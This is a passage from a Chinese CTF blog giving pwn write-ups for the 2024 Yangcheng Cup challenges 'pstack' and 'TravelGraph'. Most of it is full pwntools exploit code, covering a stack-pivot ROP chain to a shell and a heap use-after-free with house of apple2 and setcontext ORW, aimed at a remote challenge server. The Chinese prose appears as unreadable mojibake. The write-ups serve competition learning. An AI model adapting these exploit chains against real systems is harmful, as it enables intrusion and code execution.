class="built_in">range</span>(<span class="number">47</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&quot;: &quot;</span> + <span class="built_in">hex</span>(recv[i]))</span><br><span class="line">ls(libc_base)</span><br><span class="line">ls(text_base)</span><br><span class="line">ls(ret_addr)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/29/2024ycb/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="FÃ¢tih'in Ä°stanbul'u fethettiÄŸi yaÅŸtasÄ±n!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de ĞĞ°Ğ·Ñ€Ğ¸Ğ½Ğ´Ğ°Ğº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/08/29/2024ycb/" class="post-title-link" itemprop="url">[2024 ç¾ŠåŸæ¯] Pwn writeup(éƒ¨åˆ†)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-08-29 23:11:16" itemprop="dateCreated datePublished" datetime="2024-08-29T23:11:16+08:00">2024-08-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-10-15 00:22:20" itemprop="dateModified" datetime="2024-10-15T00:22:20+08:00">2024-10-15</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h1><hr>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p><img src="/images/2024ycb/2024-08-29_11-28.png" alt="2024-08-29_11-28"></p>
<p>æœ‰ä¸¤ä¸ªqwordçš„æº¢å‡ºï¼Œchecksecå‘ç°æ— pieå’Œcanary,ç›´æ¥æ ˆè¿ç§»</p>
<p>é¦–å…ˆæ”¹rbpåˆ°bssæ®µä¸Šï¼Œæ¥ç€å†è¿”å›vulnå‡½æ•°åœ¨bssæ®µä¸Šè¯»å…¥ROPé“¾ï¼Œç„¶åleave&amp;retè·³è½¬åˆ°bssæ®µROPæ³„æ¼libcåŸºå€ï¼Œæœ€åå†leave&amp;retä¸€ä¸‹æ‹¿shell.</p>
<p>æ³¨æ„è¿™ä¸ªsystem(â€œ&#x2F;bin&#x2F;shâ€)éœ€è¦å¾ˆé•¿çš„æ ˆç©ºé—´ï¼Œ è¿ç§»çš„bssæ®µåœ°å€è¦å¤§ä¸€ç‚¹ã€‚</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./pstack/pwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./pstack/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">rop = ROP(binary_path)</span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;139.155.126.78&quot;</span>, <span class="number">38040</span></span><br><span class="line"><span class="comment"># ip, port = &quot;chall.pwnable.tw&quot;, 1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_from_libc</span>(<span class="params">func_name: <span class="built_in">str</span>, func_addr: <span class="built_in">int</span>, libc=libc</span>):</span><br><span class="line">    log.success(func_name + <span class="string">&quot;: &quot;</span> + <span class="built_in">hex</span>(func_addr))</span><br><span class="line">    offset = func_addr - libc.symbols[func_name]</span><br><span class="line">    binsh = offset + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">    system = offset + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;offset: &quot;</span> + <span class="built_in">hex</span>(offset))</span><br><span class="line">    <span class="keyword">return</span> (system, binsh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line">lev_ret_addr = <span class="number">0x00000000004006DB</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400773</span></span><br><span class="line">ret_addr = <span class="number">0x00000000003FC131</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x4006C4</span></span><br><span class="line">bss_addr = <span class="number">0x601800</span></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">48</span></span><br><span class="line">payload += p64(bss_addr + <span class="number">0x30</span>)</span><br><span class="line">payload += p64(vuln_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(elf.sym.vuln)</span><br><span class="line">payload = payload.ljust(<span class="number">48</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(lev_ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = recv(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">sys, sh = search_from_libc(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(sh)</span><br><span class="line"><span class="comment"># payload += p64(ret_addr)</span></span><br><span class="line">payload += p64(sys)</span><br><span class="line">payload = payload.ljust(<span class="number">48</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload += p64(bss_addr - <span class="number">0x8</span>)</span><br><span class="line">payload += p64(lev_ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="TravelGraph"><a href="#TravelGraph" class="headerlink" title="TravelGraph"></a>TravelGraph</h1><hr>
<h2 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>é«˜ç‰ˆæœ¬(libc-2.35)å †é¢˜ï¼Œä¸è¿‡æ²¡æœ‰å»é™¤ç¬¦å·ï¼Œè°ƒè¯•åˆ†æèµ·æ¥æ–¹ä¾¿äº†å¾ˆå¤š</p>
<p><img src="/images/2024ycb/2024-08-29_12-01.png" alt="2024-08-29_12-01"></p>
<p>å¼€äº†æ²™ç®±ï¼Œè€ƒè™‘ç”¨setcontext+61æ¥æ§åˆ¶æ‰§è¡Œæµ</p>
<p><img src="/images/2024ycb/2024-08-29_12-50.png" alt="2024-08-29_12-50"></p>
<p>ç¼äº†ä¸ªdijkstraæœ€çŸ­è·¯è¿›å»ï¼Œä¸è¿‡è¿™ä¸ªé¢˜çš„æ¼æ´å’Œç®—æ³•æ— å…³ï¼Œåªæ˜¯ç”¨æ¥æ‹¿åˆ°editæ¬¡æ•°çš„ã€‚</p>
<p><img src="/images/2024ycb/2024-08-29_12-49.png" alt="2024-08-29_12-49"></p>
<p>ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé™åˆ¶åªèƒ½ç¼–è¾‘ä¸€æ¬¡ï¼Œä¸è¿‡å¤Ÿç”¨äº†ã€‚</p>
<p>addå¯ä»¥ç”³è¯·ä¸‰ç§å¤§å°çš„å †ï¼Œå¤§å°éƒ½æ˜¯large binèŒƒå›´çš„</p>
<p><img src="/images/2024ycb/2024-08-29_13-38.png" alt="2024-08-29_13-38"></p>
<p>æ˜æ˜¾çš„UAFæ¼æ´ï¼Œå…ˆé€šè¿‡æ„é€ å †ç¯å¢ƒç”¨æ¥æ³„æ¼å †åœ°å€å’ŒlibcåŸºåœ°å€ï¼Œeditçš„è¾“å…¥èŒƒå›´æ˜¯é€šè¿‡å †ä¸Šçš„ä¸€ä¸ªæ•°æ®ç¡®å®šçš„ï¼Œå¯ä»¥é€šè¿‡å¸ƒç½®å †ç¯å¢ƒæ¥æ‹¿åˆ°ä»»æ„å¤§å°çš„è¾“å…¥ï¼Œè¿™é‡Œç”¨æ¥ä¿®æ”¹bk_nextsizeçš„åŒæ—¶å¸ƒç½®ioé“¾ï¼Œæ‰“house of apple2(æ„Ÿè°¢å­¦é•¿çš„æŒ‡å¯¼)</p>
<p><img src="/images/2024ycb/2024-08-29_13-36.png" alt="2024-08-29_13-36"></p>
<p>ä¹‹åé€šè¿‡ä¸€ä¸ªmagic gadgetä¿®æ”¹rdxä¸ºå †åœ°å€ï¼Œåˆ©ç”¨setcontext+61æ§åˆ¶æ‰§è¡Œæµï¼Œæ‰“orw</p>
<p><img src="/images/2024ycb/2024-08-29_13-45.png" alt="2024-08-29_13-45"></p>
<p>åˆ©ç”¨çš„house of apple2ä¸­çš„_IO_wdefault_xsgetsnåˆ©ç”¨é“¾ï¼Œåœ¨call magic gadgetä¹‹å‰çš„rax,rbx,rdi,r15éƒ½æ˜¯å †åœ°å€ï¼Œrsiæ˜¯ä¸€ä¸ªå›ºå®šçš„å€¼ï¼Œåœ¨å †åœ°å€ç›¸åº”ä½ç½®å¸ƒç½®ä¸Šç›¸åº”çš„åœ°å€å³å¯æˆåŠŸorw</p>
<p>psï¼šlinuxç‰ˆæœ¬å¤ªé«˜å¯¼è‡´ç»™çš„libcæ­»æ´»patchä¸ä¸Šï¼ŒæŠ¥é”™seccompç‰ˆæœ¬ä¸å¯¹åº”ï¼Œå¯¼è‡´æˆ‘æœ¬æœºå’Œè¿œç¨‹åˆ†åˆ«ç”¨äº†ä¸åŒçš„magic gadgetï¼Œç—›è‹¦è°ƒè¯•å¾ˆé•¿æ—¶é—´æ‰æŠŠè¿œç¨‹æ‰“é€š</p>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"><span class="comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span></span><br><span class="line">binary_path = <span class="string">&quot;./TravelGraph/pwn&quot;</span></span><br><span class="line"><span class="comment"># libc_path = &quot;/home/NazrinDuck/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/libc.so.6&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./TravelGraph/libc.so.6&quot;</span></span><br><span class="line">ld_path = <span class="string">&quot;/home/NazrinDuck/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span></span><br><span class="line"></span><br><span class="line">rop = ROP(binary_path)</span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"><span class="comment"># libc_dll = cdll.LoadLibrary(libc_path)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;139.155.126.78&quot;</span>, <span class="number">38875</span></span><br><span class="line"><span class="comment"># ip, port = &quot;chall.pwnable.tw&quot;, 1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def search(func_name: str, func_addr: int):</span></span><br><span class="line"><span class="string">    log.success(func_name + &quot;: &quot; + hex(func_addr))</span></span><br><span class="line"><span class="string">    libc = LibcSearcher(func_name, func_addr)</span></span><br><span class="line"><span class="string">    offset = func_addr - libc.dump(func_name)</span></span><br><span class="line"><span class="string">    binsh = offset + libc.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">    system = offset + libc.dump(&quot;system&quot;)</span></span><br><span class="line"><span class="string">    log.success(&quot;system: &quot; + hex(system))</span></span><br><span class="line"><span class="string">    log.success(&quot;binsh: &quot; + hex(binsh))</span></span><br><span class="line"><span class="string">    return (system, binsh)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_from_libc</span>(<span class="params">func_name: <span class="built_in">str</span>, func_addr: <span class="built_in">int</span>, libc=libc</span>):</span><br><span class="line">    log.success(func_name + <span class="string">&quot;: &quot;</span> + <span class="built_in">hex</span>(func_addr))</span><br><span class="line">    offset = func_addr - libc.symbols[func_name]</span><br><span class="line">    binsh = offset + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">    system = offset + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;offset: &quot;</span> + <span class="built_in">hex</span>(offset))</span><br><span class="line">    <span class="keyword">return</span> (system, binsh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># __libc_start_main</span></span><br><span class="line"></span><br><span class="line">csu_start = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">edi=<span class="number">0</span>, rsi=<span class="number">0</span>, rdx=<span class="number">0</span>, r12=<span class="number">0</span>, start=csu_start, mode=<span class="number">0</span></span>):</span><br><span class="line">    end = start + <span class="number">0x1A</span></span><br><span class="line">    payload = p64(end)</span><br><span class="line">    payload += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">        payload += p64(r12)  <span class="comment"># r12</span></span><br><span class="line">        payload += p64(edi)  <span class="comment"># edi</span></span><br><span class="line">        payload += p64(rsi)  <span class="comment"># rsi</span></span><br><span class="line">        payload += p64(rdx)  <span class="comment"># rdx</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += p64(edi)  <span class="comment"># r12</span></span><br><span class="line">        payload += p64(rsi)  <span class="comment"># edi</span></span><br><span class="line">        payload += p64(rdx)  <span class="comment"># rsi</span></span><br><span class="line">        payload += p64(r12)  <span class="comment"># rdx</span></span><br><span class="line">    payload += p64(start)</span><br><span class="line">    payload += <span class="string">b&quot;a&quot;</span> * <span class="number">56</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sig</span>(<span class="params">rax=<span class="number">0</span>, rdi=<span class="number">0</span>, rsi=<span class="number">0</span>, rdx=<span class="number">0</span>, rsp=<span class="number">0</span>, rip=<span class="number">0</span></span>):</span><br><span class="line">    sigframe = SigreturnFrame()</span><br><span class="line">    sigframe.rax = rax</span><br><span class="line">    sigframe.rdi = rdi  <span class="comment"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class="line">    sigframe.rsi = rsi</span><br><span class="line">    sigframe.rdx = rdx</span><br><span class="line">    sigframe.rsp = rsp</span><br><span class="line">    sigframe.rip = rip</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(sigframe)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.35</span></span><br><span class="line"><span class="comment"># 2.37</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># transport: car, train, plane</span></span><br><span class="line"><span class="comment"># size ----&gt;  0x510 0x520 0x530</span></span><br><span class="line"><span class="comment"># max ---&gt; 0x3e8</span></span><br><span class="line">transport = [<span class="string">b&quot;car&quot;</span>, <span class="string">b&quot;train&quot;</span>, <span class="string">b&quot;plane&quot;</span>]</span><br><span class="line">city = [<span class="string">b&quot;guangzhou&quot;</span>, <span class="string">b&quot;nanning&quot;</span>, <span class="string">b&quot;changsha&quot;</span>, <span class="string">b&quot;nanchang&quot;</span>, <span class="string">b&quot;fuzhou&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">transport_num, city_from, city_to, size, note</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;.\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;?\n&quot;</span>, transport[transport_num])</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;name\n&quot;</span>, city[city_from])</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;name\n&quot;</span>, city[city_to])</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;far?\n&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Note:\n&quot;</span>, note)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">city_from, city_to</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;.\n&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;?\n&quot;</span>, city[city_from])</span><br><span class="line">    p.sendlineafter(<span 